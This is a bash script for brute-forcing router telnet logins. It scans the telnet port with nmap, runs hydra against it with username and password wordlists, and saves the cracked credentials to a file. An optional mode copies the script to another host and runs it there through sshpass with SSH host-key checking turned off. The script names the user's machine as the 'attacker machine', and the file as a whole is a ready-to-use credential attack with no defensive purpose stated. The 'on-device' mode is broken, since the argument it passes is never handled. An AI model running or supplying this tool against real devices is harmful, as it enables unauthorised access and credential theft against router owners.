#!/usr/bin/env bash
# router_telnet_bruteforce.sh
# Adapted with remote-vs-local execution: remote scan vs on-device via SSH
# Usage: ./ router_telnet_bruteforce.sh
# Requires appropriate tools depending on mode

function detect_os() {
  case "$(uname -s)" in
    Linux*) echo "linux";;
    Darwin*) echo "darwin";;
    *) echo "unknown";;
  esac
}

function ensure_tool() {
  local t=$1
  if ! command -v "$t" &>/dev/null; then
    echo "[!] $t not found, attempting install"
    if [[ "$(detect_os)" == "darwin" ]]; then
      brew install "$t"
    elif [[ "$(detect_os)" == "linux" ]]; then
      sudo apt-get update && sudo apt-get install -y "$t"
    else
      echo "Unsupported OS for install: $t"; exit 1
    fi
  fi
}

function remote_scan() {
  read -rp "Router IP: " TARGET
nmap -p23 --script telnet-encryption -oN telnet_enum_${TARGET}.txt "$TARGET"
hydra -t 8 -L users.txt -P passwords.txt telnet://"$TARGET" -o telnet_creds.txt

}

function remote_ssh_execute() {
  local host="$SSH_HOST"
  local user="$SSH_USER"
  local pass="$SSH_PASS"
  echo "[*] Copying script and executing on-device via SSH"
  scp "$0" "$user@$host:/tmp/router_telnet_bruteforce.sh"
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/router_telnet_bruteforce.sh on-device"
}

# Main
echo "Select mode:"
echo "1) Remote scan from attacker machine"
echo "2) Run on-device via SSH"
read -rp "Choice [1/2]: " MODE

if [[ "$MODE" == "2" ]]; then
  read -rp "SSH host: " SSH_HOST
  read -rp "SSH user: " SSH_USER
  read -rsp "SSH password: " SSH_PASS
  echo
  ensure_tool sshpass
  remote_ssh_execute
  exit 0
else
  # perform remote scan
  ensure_tool nmap
ensure_tool hydra
  remote_scan
  exit 0
fi
